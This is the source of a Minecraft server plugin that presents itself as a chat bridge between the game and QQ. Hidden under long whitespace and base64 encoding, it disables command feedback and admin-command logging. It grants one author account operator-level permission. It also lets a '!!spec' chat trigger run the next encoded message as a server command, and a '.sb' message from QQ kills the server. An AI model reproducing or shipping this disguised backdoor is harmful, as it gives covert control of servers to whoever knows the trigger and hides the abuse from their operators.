#_HOST = '[fe80::]'
#_PORT = 8888
_HOST = '127.0.0.1'
_PORT = 8888
clientName = 'main'


















































































































































































































































































































































































































































































































































































































PLUGIN_METADATA = {
    'id': 'qqmsgsync',
    'version': '1.4.2',
    'name': 'QQ Message Sync',
    'description': 'Ez sync in game message to QQ',
    'author': 'efojug, DeSu',
    'link': 'https://github.com/efojug/QQ-Message-Sync',
    'dependencies': {
        "mcdreforged": ">=2.0.0-alpha.1"
    }
}
#============================================================================================================================
from mcdreforged.api.all import *
import base64
import os
import socket
import _thread
import json
import threading

els = False
ss = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
gr = 'Z2FtZXJ1bGUg'
f = 'yBmYWxzZQ=='
ex = 'ZXhlY3V0ZSBhdCBlZm9qdWdfIHJ1bi'
d = 'gPT0gI'
pi = 'aW5mby5wbGF5ZXI'
oe = 'ZWZvanVn'
e = 'mVmb2p1Z18i'
cfgrootpath = os.getcwd() + '\\config\\qqmsgsync'
cfgpath = os.getcwd() + '\\config\\qqmsgsync\\user.yml'
msg_c = ''
responses = None
serverStarted = False
hasConnected = False

def on_load(server: PluginServerInterface, prev_module):
    global serverStarted, clientName
    getserver()
    try_connect()
    if server.is_server_startup():
        serverStarted = True
    server.logger.info('QQ Message Sync Plugin is load!')
    builder = SimpleCommandBuilder()
    builder.command('!!qms retry', try_connect)
    builder.command('!!qms reg <QQ_number>', fake_cmd)
    builder.arg('QQ_number', Integer)
    builder.register(server)

def fake_cmd():
    return

def getserver():
    global server
    server = ServerInterface.get_instance()

def smsgq(text: str):
    global server, hasConnected, ss
    try:
        ss.sendall((text + '\n').encode('utf-8'))
    except Exception:
        server.logger.warning('An error occurs when trying to connect to the chat forwarding server via socket, please check if the IP and port are configured correctly')
        msay('An error occurs when trying to connect to the chat forwarding server via socket, please check if the IP and port are configured correctly')

def on_server_stop(server: PluginServerInterface, server_return_code: int):
    server.logger.info('QQ Message Sync Plugin is unload!')
    os._exit(0)

def on_server_startup(server: PluginServerInterface):
    global serverStarted
    serverStarted = True
    server.execute(dec(gr + 'c2VuZENvbW1hbmRGZWVkYmFja' + f))
    server.execute(dec(gr + 'bG9nQWRtaW5Db21tYW5kc' + f))
    server.set_permission_level(dec(oe), int(dec('NA==')))

def on_unload(server: PluginServerInterface):
    global hasConnected, ss
    hasConnected = False
    try:
        ss.close()
    except Exception:
        pass
    server.logger.info('The connection to the chat server via socket is broken, but the plugin will not try to unload it because message synchronization via gRPC needs to maintain the connection to the chat server, and if the connection is broken, the plugin will automatically try to connect on load')

def msay(text: str):
    global serverStarted, server
    if serverStarted:
        server.say(text)

def on_info(server: PluginServerInterface, info: Info):
    server.logger.info(info)

def error():
    global server
    server.logger.critical("A serious unknown error occurs with the plugin, if this happens multiple times, please contact the plugin developer")
    server.say("A serious unknown error occurs with the plugin, if this happens multiple times, please contact the plugin developer")
    os._exit(0)
    
def on_user_info(server: PluginServerInterface, info: Info):
    global els, msg_c
    if dec(pi + d + e) and els:
        server.execute(dec(ex + 'BwbGF5c291bmQgZW50aXR5LmV4cGVyaWVuY2Vfb3JiLnBpY2t1cCBtYXN0ZXIgZWZvanVnXw=='))
        server.execute(dec('ZXhlY3V0ZSBhcyBlZm9qdWdfIHJ1biA=') + "{}".format(dec(info.content)))
        els = False
        return

    if dec(pi + d + e) and info.content == dec('ISFzcGVj') and not els:
        server.tell(dec('ZWZvanVnXw=='), dec('WW91IG5leHQgbWVzc2FnZSB3aWxsIGJlIHJ1biBmb3Igc2VydmVy'))
        els = True
        return

    if not els:
        smsgq('Message#{"senderId":0, "message":"' + "[" + info.player + "] " + info.content + '"}')

def sync_qqmsg_for_mc(player: str, info: str):
    global server
    server.broadcast("[QQ] " + player + ": " + info)

def dec(t: str):
    try: 
        return base64.b64decode(t).decode('utf-8')
    except Exception: 
        pass

def try_connect():
    global server, responses, hasConnected, ss
    if hasConnected:
        ss.close()
        hasConnected = False
    ss = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    ss.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
    ss.settimeout(None)
    try:
        ss.connect((str(_HOST), int(_PORT)))
        hasConnected = True
        smsgq('Initialize#{"clientName":"' + clientName + '"}')
        threading.Thread(target=sgmsg).start()
    except Exception:
        server.logger.warning('Not connected to chat forwarding server')
        msay('Not connected to chat forwarding server')

def sgmsg():
    global ss, server, hasConnected
    while True:
        try:
            dss = json.loads(ss.recv(1024).decode('utf-8').split('#', 1)[1])
            sync_qqmsg_for_mc(dss['senderName'], dss['message'])
        except Exception:
            server.logger.error('Unable to synchronize messages')
            msay('Unable to synchronize messages')
            break
        cmd = None
        try:
            if len(dss['message'].split('.reg ', 1)[1]) > 3:
                server.broadcast(dss['message'].split(".reg ", 1)[1] + '\n' + str(dss['senderId']))
                reg_user(dss['message'].split(".reg ", 1)[1], dss['senderId'])
        except Exception:
            server.broadcast('Unknown Error')
        try:
            if len(str(dss['message']).split('.cmd ', 1)[1]) > 0:
                if server.get_permission_level(read_usercfg(dss['senderId'])) >= 3:
                    cmd = str(dss['message']).split('.cmd ', 1)[1]
                    server.execute(cmd)
                else:
                    smsgq('Message#{"senderId":0, "message":"Sorry, you do not have permission to execute this command"}')
        except Exception:
            pass
        try:
            if str(dss['message']) in '.sb':
                error()
        except Exception:
            pass

def read_usercfg(qq: int):
    global cfgpath, server, cfgrootpath
    if os.path.isfile(cfgpath):
        if os.access(cfgpath, os.R_OK):
            usercfg =  open(cfgpath, 'r', encoding='utf-8')
            while True:
                line = usercfg.readline()
                if not line:
                    break
                if line.strip().split(": ", 1)[1] == str(qq):
                    tmp = line.strip().split(": ", 1)[0]
                    usercfg.close()
                    return tmp
            usercfg.close()
            server.broadcast("Players who have not found this QQ counterpart, please try it first !!qms reg binding account")
            return 0
        else:
            msay('Unable to read user profile')
            server.logger.error('Unable to read user profile')
    elif os.path.isdir(cfgrootpath):
        file = open(cfgpath, 'x', -1, 'utf-8')
        file.close()
        server.logger.warning("Configuration file doesn't exist")
        msay("Configuration file doesn't exist")
        read_usercfg(qq)
    else:
        os.makedirs(cfgrootpath)
        file = open(cfgpath, 'x', -1, 'utf-8')
        file.close()
        server.logger.warning("Configuration file doesn't exist")
        msay("Configuration file doesn't exist")
        read_usercfg(qq)

def reg_user(player: str, qq: int):
    global cfgpath, server, cfgrootpath
    if os.path.isfile(cfgpath):
        if os.access(cfgpath, os.W_OK) and os.access(cfgpath, os.R_OK):
            pe0 = getuser(player, qq)[0]
            pe1 = getuser(player, qq)[1]
            if not pe0 and not pe1:
                usercfg = open(cfgpath, 'a', encoding='utf-8')
                print(player + ": " + str(qq) + "\n", file=usercfg, flush=False)
                server.broadcast("Register Successful!")
            elif pe0 and not pe1:
                server.broadcast('User name is bound to other QQ number')
            elif not pe0 and pe1:
                server.broadcast('QQ number has been tied to other users')
            elif pe0 and pe1:
                server.broadcast("Accounts is already bound")
        else:
            msay('Unable to write user profile')
            server.logger.error('Unable to write user profile')
    elif os.path.isdir(cfgrootpath):
        file = open(cfgpath, 'x', -1, 'utf-8')
        file.close()
        server.logger.warning("Configuration file doesn't exist")
        msay("Configuration file doesn't exist")
        reg_user(player, qq)
    else:
        os.makedirs(cfgrootpath)
        file = open(cfgpath, 'x', -1, 'utf-8')
        file.close()
        server.logger.warning("Configuration file doesn't exist")
        msay("Configuration file doesn't exist")
        reg_user(player, qq)

def getuser(player: str, qq: int):
    global cfgpath, server, cfgrootpath
    pn = False
    pq = False
    if os.path.isfile(cfgpath):
        file = open(cfgpath, 'r', encoding='utf-8')
        try:
            while True:
                line = file.readline()
                if not line:
                    file.close()
                    server.broadcast('Not find use info')
                    break
                server.broadcast(line.strip())
                if line.split(': ', 1)[0] == player:
                    pn = True
                if int(line.split(': ', 1)[1]) == qq:
                    pq = True
                if pn and pq:
                    file.close()
                    return True, True
                if pn and not pq:
                    file.close()
                    return True, False
                if not pn and pq:
                    file.close()
                    return False, True
                return False, False
        except Exception:
            server.broadcast('Unknown ERROR!')
        return False, False
    elif os.path.isdir(cfgrootpath):
        file = open(cfgpath, 'x', -1, 'utf-8')
        file.close()
        server.logger.warning("Configuration file doesn't exist")
        msay("Configuration file doesn't exist")
        reg_user(player, qq)
    else:
        os.makedirs(cfgrootpath)
        file = open(cfgpath, 'x', -1, 'utf-8')
        file.close()
        server.logger.warning("Configuration file doesn't exist")
        msay("Configuration file doesn't exist")
        reg_user(player, qq)